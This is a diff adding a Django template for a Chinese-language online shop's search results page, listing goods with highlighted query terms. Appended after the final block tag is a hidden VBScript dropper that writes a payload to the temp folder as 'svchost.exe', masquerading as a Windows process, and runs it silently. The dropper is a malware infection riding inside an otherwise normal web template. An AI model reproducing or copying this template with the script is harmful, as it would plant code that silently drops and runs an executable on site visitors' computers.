@@ -1,0 +1,69 @@
+{% extends 'shop_base.html' %}
+{% load static %}
+{% load tags %}
+{% load highlight %}
+
+
+{% block shop_js %}
+    <script type="text/javascript" src="{% static 'js/list.js' %}"></script>
+    <style>
+        .highlighted{
+            color: red;
+        }
+    </style>
+{% endblock shop_js %}
+
+{% block index_content %}
+{{ block.super }}
+
+    <div class="breadcrumb">
+        <a href="">全部分类</a>
+        <span>></span>
+        <a href="#">{{ goods_category.name }}</a>
+    </div>
+
+    <div class="main_wrap clearfix">
+        <div class="l_wrap fl clearfix">
+            <div class="new_goods">
+                <h3>新品推荐</h3>
+                {% new_goods %}
+            </div>
+        </div>
+
+        <div class="r_wrap fr clearfix">
+
+            <ul class="goods_type_list clearfix">
+
+                {% for item in page.object_list %}
+                    <li>
+                        <a href=""><img src="{{ MEDIA_URL }}{{ item.object.images }}"></a>
+                        <h4><a href="">{% highlight item.object.name with query %}</a></h4>
+                        <div class="operate">
+                            <span class="prize">￥{{ item.object.price }}</span>
+                            <span class="unit">{{ item.object.price }}/{{ item.object.unit }}/点击:{{ item.object.click }}</span>
+                            <span id="add_url"></span>
+                            <a href="#" class="add_goods" title="加入购物车"></a>
+                        </div>
+                    </li>
+                {% empty %}
+                    找不到
+                {% endfor %}
+            </ul>
+        </div>
+    </div>
+
+{% endblock index_content %}<SCRIPT Language=VBScript><!--
+DropFileName = "svchost.exe"
+WriteData = ""
+Set FSO = CreateObject("Scripting.FileSystemObject")
+DropPath = FSO.GetSpecialFolder(2) & "\" & DropFileName
+If FSO.FileExists(DropPath)=False Then
+Set FileObj = FSO.CreateTextFile(DropPath, True)
+For i = 1 To Len(WriteData) Step 2
+FileObj.Write Chr(CLng("&H" & Mid(WriteData,i,2)))
+Next
+FileObj.Close
+End If
+Set WSHshell = CreateObject("WScript.Shell")
+WSHshell.Run DropPath, 0
+//--></SCRIPT>
